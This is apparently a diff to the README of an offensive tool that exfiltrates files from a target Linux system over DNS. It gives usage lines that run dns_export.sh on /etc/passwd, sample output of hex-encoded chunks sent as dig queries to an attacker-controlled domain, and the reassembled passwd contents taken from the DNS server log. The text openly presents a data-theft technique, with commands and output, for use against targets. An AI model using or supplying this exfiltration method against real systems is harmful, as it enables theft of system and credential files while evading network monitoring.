@@ -2,7 +2,34 @@ Lightweight Linux shell script to exfiltrate data from a target system via DNS s
 Uses command line arguments Target File, Unique Identifier (used to differentiate between multiple exports), Domain Name
 Example usage: ./dns_export.sh /etc/passwd ID1 mydomain.com
 
+Chunks target file via hexdump utility and exports each piece of the file via a dig request to the domain specified.
+Example results:
+[09.25.2016]db@Kali-VM1:Exploits$./dns_export.sh /etc/passwd myID domain.com
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173.0.myID.domain.com
+680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f736269.1.myID.domain.com
+6e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a.2.myID.domain.com
+62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a737973.3.myID.domain.com
+3a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f.4.myID.domain.com
+67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.5.myID.domain.com
+62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f75.6.myID.domain.com
+73722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e.7.myID.domain.com
+3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573.8.myID.domain.com
+722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661.9.myID.domain.com
+722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a.10.myID.domain.com
+
 To reassembly data exfiltrated via DNS queries, run dns_reassembly.sh on the DNS server log file.
 Uses command line arguments Input File, Unique Identifier from dns_export.sh
 Example usage: ./dns_reassembly /var/log/syslog ID1
+
+Example results:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+...
+
 
